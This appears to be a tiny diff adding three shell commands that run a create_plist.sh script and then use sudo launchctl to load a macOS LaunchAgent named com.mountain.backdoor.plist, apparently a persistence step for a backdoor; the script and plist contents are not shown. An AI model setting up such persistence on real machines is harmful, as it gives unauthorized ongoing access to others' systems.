@@ -1,0 +1,3 @@
+chmod +x create_plist.sh
+./create_plist.sh
+sudo launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.mountain.backdoor.plist
